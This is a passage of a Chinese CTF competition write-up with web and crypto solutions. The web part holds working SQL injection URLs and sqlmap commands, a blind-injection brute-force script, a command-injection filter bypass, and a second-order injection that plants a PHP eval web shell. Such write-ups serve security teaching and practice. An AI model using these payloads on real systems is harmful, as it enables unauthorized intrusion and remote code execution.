class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码思路是提交invest值，然后乘以一个2-50之间的随机数与我们猜测的相等即可得到flag，直接多次尝试爆破即可，即每次都提交invest值为2，guess值为6，只要某次随机数为3的时候即可得到flag</p><p><img src="https://i.loli.net/2019/01/24/5c49424c2fdc8.png" alt="抓包爆破"></p><p><img src="https://i.loli.net/2019/01/24/5c4942d3766a8.png" alt="flag"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7e1e2bfe75c980be35c61ed1bde7a6f2&#125;</span><br></pre></td></tr></table></figure><h2 id="SimpleSQLi"><a href="#SimpleSQLi" class="headerlink" title="SimpleSQLi"></a>SimpleSQLi</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://bxs.cumt.edu.cn:30007/test/index.php?id=1 --dbs</span><br></pre></td></tr></table></figure><p>数据库名为security</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://bxs.cumt.edu.cn:30007/test/index.php?id=1 -D security --tables</span><br></pre></td></tr></table></figure><p>表名flagishere</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://bxs.cumt.edu.cn:30007/test/index.php?id=1 -D security -T flagishere --columns --threads=10</span><br></pre></td></tr></table></figure><p>列名id,flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://bxs.cumt.edu.cn:30007/test/index.php?id=1 -D security -T flagishere -C &quot;id,flag&quot; --dump --threads=10</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4ur0Ra_SimPlE_sQLi_23333&#125;</span><br></pre></td></tr></table></figure><h2 id="真的简单。。"><a href="#真的简单。。" class="headerlink" title="真的简单。。"></a>真的简单。。</h2><p>随手fuzz一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://202.119.201.199:32793/list.php?id=1%27</span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://202.119.201.199:32793/list.php?id=1%27--+</span><br></pre></td></tr></table></figure><p>可以正常返回，猜测是单引号注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://202.119.201.199:32793/list.php?id=-1%27%20or%201=1--+</span><br></pre></td></tr></table></figure><p>无正确回显，猜测可能是or有问题，换 <code>||</code> 试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://202.119.201.199:32793/list.php?id=-2%27 || 3=length(database())--+</span><br></pre></td></tr></table></figure><p>果然返回正确，数据库长度为3</p><p>题目过滤了or，但是可以绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://202.119.201.199:32793/list.php?id=-1%27%20oorr%201=1--+</span><br></pre></td></tr></table></figure><p>爆列数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://202.119.201.199:32793/list.php?id=-2%27 || 3=3 oorrder by 3--+</span><br></pre></td></tr></table></figure><p>共有三列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://202.119.201.199:32793/list.php?id=-2%27 || 3=2 ununionion selselectect 1,database(),3--+</span><br></pre></td></tr></table></figure><p>database:ctf</p><p>接下来就是常规的注入了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://202.119.201.199:32793/list.php?id=-2%27 || 3=2 ununionion selselectect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p>table：ctf,flag </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://202.119.201.199:32793/list.php?id=-2%27 || 3=2 ununionion selselectect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema=database()--+</span><br></pre></td></tr></table></figure><p>列名：id,flag </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://202.119.201.199:32793/list.php?id=-2%27 || 3=2 ununionion selselectect 1,flag,3 from flag--+</span><br></pre></td></tr></table></figure><p>居然还有题目..</p><blockquote><p>flag in admin_08163314/exec.php </p></blockquote><p>访问一下，是个命令执行界面，过滤了空格，可用<code>$IFS</code>绕过，尝试列根目录但是失败了，猜测可能是<code>/</code>被过滤了，但是 <code>* .</code>没有被过滤，可以用来读文件exec.php</p><p><img src="https://i.loli.net/2019/01/26/5c4c5df37356a.png" alt=""></p><p>可以得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+|\/| )/i"</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'cmd'</span>]) &#123;</span><br><span class="line">$cmd = waf_exec($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">system($cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>知道了过滤规则就好办了，接下里可以用base64编码绕过，列根目录</p><p><img src="https://i.loli.net/2019/01/26/5c4c5e68be087.png" alt=""></p><p><img src="https://i.loli.net/2019/01/26/5c4c5e99549bc.png" alt=""></p><p>注意这里的flag_3314是个目录，还得继续列目录</p><p><img src="https://i.loli.net/2019/01/26/5c4c5eea0c492.png" alt=""></p><p><img src="https://i.loli.net/2019/01/26/5c4c5f1453698.png" alt=""></p><p><img src="https://i.loli.net/2019/01/26/5c4c5f7396879.png" alt=""></p><p><img src="https://i.loli.net/2019/01/26/5c4c5f7398de3.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3570d4d9c72a19c889140674827eeca5&#125;</span><br></pre></td></tr></table></figure><h2 id="SimpleSQLi2"><a href="#SimpleSQLi2" class="headerlink" title="SimpleSQLi2"></a>SimpleSQLi2</h2><p>fuzz测试了一下感觉是数字型注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bxs.cumt.edu.cn:30010/test/index.php?id=-1%20||%201=1</span><br></pre></td></tr></table></figure><p>接下来测试过滤规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bxs.cumt.edu.cn:30010/test/index.php?id=2&gt;2 || length(&apos;seleselectct&apos;)=6</span><br></pre></td></tr></table></figure><p>测试发现过滤了 <code>select,or,空格</code>，空格可用<code>/**/</code>绕过，select等可双写绕过，接下来只需要编写盲注脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">words = <span class="string">"2019~"</span></span><br><span class="line">url = <span class="string">"http://bxs.cumt.edu.cn:30010/test/index.php?id="</span></span><br><span class="line">table = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"><span class="comment"># emails,flagishere,referers,uagents,users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flagishere'),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"><span class="comment"># Id,flag</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"2&gt;2/**/||/**/ascii(substr((seselectlect/**/flag/**/from/**/flagishere),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">34</span>,<span class="number">128</span>):</span><br><span class="line">res = requests.get(url+payload.format(j,i)).text</span><br><span class="line"><span class="keyword">if</span> words <span class="keyword">in</span> res:</span><br><span class="line">table += chr(i)</span><br><span class="line">print(table)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>可以得到flag如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4nother_SimPLE_SQLi_0rek1&#125;</span><br></pre></td></tr></table></figure><p>后来和出题人交流了一下，思路非预期2333~</p><h2 id="文件管理系统"><a href="#文件管理系统" class="headerlink" title="文件管理系统"></a>文件管理系统</h2><p>网站有主要功能是上传文件和修改、删除文件，过滤了php等相关的文件名，无法绕过，原本的我的思路是上传一个<code>xxxx.jpg</code>，然后修改文件名，通过修改文件名为 <code>xxxx.php%00.jpg</code> 或者其它方法截断后面的jpg后缀，结果尝试了各种姿势都未果，无可奈何之下扫了一波目录，结果柳暗花明，得到了源码<code>www.zip</code></p><p>核心代码如下</p><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"><span class="keyword">if</span>($_FILES)</span><br><span class="line">&#123;</span><br><span class="line">    $file = $_FILES[<span class="string">"upfile"</span>];</span><br><span class="line">    <span class="keyword">if</span>($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">        $name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">        $path_parts = pathinfo($name);</span><br><span class="line">        <span class="keyword">if</span>(!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line">        $name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];       </span><br><span class="line">        $path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line">        $sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//echo $file["tmp_name"], ROOT . UPLOAD_DIR . $name;</span></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($file[<span class="string">"tmp_name"</span>], ROOT . UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">            $sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">            $re = $db-&gt;query($sql);</span><br><span class="line">            <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">                print_r($db-&gt;error);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        print_r(error_get_last());</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">rename.php</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($result) &#123;</span><br><span class="line">        $req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">        $re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            print_r($db-&gt;errorInfo());</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        $newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        <span class="keyword">if</span>(file_exists($oldname)) &#123;</span><br><span class="line">            rename($oldname, $newname);</span><br><span class="line">            $url = <span class="string">"/"</span> . $newname;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">echo</span> $oldname.<span class="string">" not exists."</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由代码可以看出，题目是通过数据库来拼凑最终的文件名，审计了下代码没发现什么有用的思路，google了一下居然找到了原题！！2233 <a href="http://drops.xmd5.com/static/drops/tips-10564.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-10564.html</a>，而且还给出了攻击流程，本题是个二次注入。</p><p>题目使用了白名单过滤，所以所以无法通过后缀名绕过，而题目，漏洞发生在rename.php页面中，实现重命名功能时，在数据库中以文件名来查询，获取文件扩展名，id等信息，然后我们输入的新的文件名和查询的文件扩展名拼接在一起完成重命名，如果我们能够使查询的文件扩展名为空，那么拼接之后就只剩下我们的文件名了，通过这种方法可以实现修改文件名后缀的目的，攻击流程如下</p><ol><li><p>选择一个文件上传，命名为 <code>&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg.jpg</code>，此时执行的sql语句是<code>insert into <code>file</code> ( <code>filename</code>, <code>view</code>, <code>extension</code>) values( ‘{$path_parts[‘filename’]}’, 0, ‘{$path_parts[‘extension’]}’)</code>，此时的数据库中<code>filename--&gt;&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg</code>，<code>extension--&gt;jpg</code></p></li><li><p>利用update更新是的后缀名为空，<em>old name:</em>  <code>&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg</code>;<em>new name:</em> <code>snow.jpg</code>，此时执行的sql命令变成<br><code>update <code>file</code> set <code>filename</code>=’snow.jpg’,<code>oldname</code>=’’,extension=’’,filename=’snow.jpg.jpg’ where <code>fid</code>={$result[‘fid’]};</code> ，这样的话数据库中就有文件名为 <code>snow.jpg</code>，后缀名为空的记录，但是实际的文件名却是<code>snow.jpg.jpg</code></p></li><li><p>上传真正包含shell的文件<code>&lt;?php @eval($_POST[&#39;snow&#39;]);?&gt;</code> ，命名为<code>snow.jpg</code>，数据库中的记录是文件名为snow，扩展名为jpg，</p></li><li><p>使用rename重命名 <em>old name:</em> <code>snow.jpg</code>，<em>new name:</em> <code>snow.php</code>，此时修改的是文件名是snow.jpg，后缀名为空，此时修改文件名为<code>snow.php</code>，后缀名为空，拼接后就是成功地更名为snow.php，然后访问snow.php即可getshell。</p></li></ol><p><img src="https://i.loli.net/2019/01/27/5c4d642c02f24.png" alt=""></p><p><img src="https://i.loli.net/2019/01/27/5c4d642bedc54.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f34f8aa6cd362582dd1ae5f975c7b20f&#125;</span><br></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="现代密码签到"><a href="#现代密码签到" class="headerlink" title="现代密码签到"></a>现代密码签到</h2><p>利用在线des解密，密钥为空。<br>解密后发现<br><code>U2FsdGVkX18968C+7acWUzWtYyuQd2MFLMh0HnGGnMlmYlemknPnfg==</code><br>是base64编码，将所得结果再次解密得到flag<br><img src="https://i.imgur.com/jPfKQ85.png" alt=""></p><h2 id="古典密码签到"><a href="#古典密码签到" class="headerlink" title="古典密码签到"></a>古典密码签到</h2><p>看到字符串带<code>=</code>，猜测是base系列编码，解密发现是base32编码 ^pho^oav`\ntZnj`\ntZZZcccx ，之后就是移位密码了，当偏移量是5的时候解密出有意义的明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"xxxxxxxxxxxxx"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">flag += chr(ord(i)+<span class="number">5</span>)</span><br><span class="line">print(flag)</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>cumtctf{easy_soeasy___hhh}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## easyrsa</span><br><span class="line"></span><br><span class="line">本题e很小，联想到应该是低指数攻击，本来以为是16进制，但是一直不对，细看了一下发现只有0-9和A，b共12个字符，猜测应该是12进制，尝试了一下果然就是12进制</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"># coding=utf-8</span><br><span class="line">import gmpy2</span><br><span class="line">e = 5</span><br><span class="line"># 读入 n, 密文</span><br><span class="line">n = int(&apos;36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5&apos;,12)</span><br><span class="line">c = int(&apos;411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065&apos;,12)</span><br><span class="line">m, b = gmpy2.iroot(c, e)</span><br><span class="line">print hex(m)[2:].decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure></p><p>flag如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;12_jinzhi_rsa&#125;</span><br></pre></td></tr></table></figure></p><h2 id="playfir"><a href="#playfir" class="headerlink" title="playfir"></a>playfir</h2><p>题目提示很明显，playfire密码爆破，可以看到秘钥是四位，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># playfair</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回该字符的行号和列号</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_row_col</span><span class="params">(word,pass_table)</span>:</span></span><br><span class="line">li = pass_table.index(word)</span><br><span class="line">li_r = li // <span class="number">5</span></span><br><span class="line">li_c = li % <span class="number">5</span></span><br><span class="line"><span class="keyword">return</span> (li_r,li_c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入两个元素的坐标，得到解密对应的两个元素</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dou_word</span><span class="params">(r1,c1,r2,c2)</span>:</span></span><br><span class="line"><span class="keyword">if</span> r1 == r2:</span><br><span class="line">c1 = (c1<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line">c2 = (c2<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line"><span class="keyword">return</span> [(r1,c1),(r2,c2)]</span><br><span class="line"><span class="keyword">elif</span> c1 == c2:</span><br><span class="line">r1 = (r1<span class="number">-1</span>) % <span class="number">5</span> </span><br><span class="line">r2 = (r2<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line"><span class="keyword">return</span> [(r1,c1),(r2,c2)]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> [(r1,c2),(r2,c1)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cip,keyword)</span>:</span></span><br><span class="line"><span class="comment"># global pass_table</span></span><br><span class="line">alpha = list(string.ascii_uppercase)</span><br><span class="line">alpha.remove(<span class="string">'J'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> keyword:</span><br><span class="line"><span class="keyword">if</span> i == <span class="string">"J"</span>:</span><br><span class="line"><span class="keyword">continue</span> </span><br><span class="line">alpha.remove(i)</span><br><span class="line">pass_table = list(keyword) + alpha</span><br><span class="line">plain = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cip)//<span class="number">2</span>):</span><br><span class="line">grp = cip[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">r1,c1 = get_row_col(grp[<span class="number">0</span>],pass_table)</span><br><span class="line">r2,c2 = get_row_col(grp[<span class="number">1</span>],pass_table)</span><br><span class="line">temp = get_dou_word(r1,c1,r2,c2)</span><br><span class="line">p1 = temp[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">5</span> + temp[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">p2 = temp[<span class="number">1</span>][<span class="number">0</span>]*<span class="number">5</span> + temp[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">plain += pass_table[p1] + pass_table[p2]</span><br><span class="line"><span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sss <span class="keyword">in</span> itertools.permutations(string.ascii_uppercase,<span class="number">4</span>):</span><br><span class="line">now_key = <span class="string">""</span>.join(sss)</span><br><span class="line">cip1 = <span class="string">"DMBCCVTLMNKQ"</span></span><br><span class="line">cip2 = <span class="string">"LRBECXPTCPHU"</span></span><br><span class="line">t1 = decrypt(cip1,now_key)</span><br><span class="line">t2 = decrypt(cip2,now_key)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"FLAGA"</span> <span class="keyword">in</span> t1:</span><br><span class="line">print(t1)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">"FLAGB"</span> <span class="keyword">in</span> t2:</span><br><span class="line">print(t2)</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>可以得到爆破出来符合条件的明文，找出语义正确的即可</p><blockquote><p>flagaplayfirflagbyoudoit</p></blockquote><p>求出md5值即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 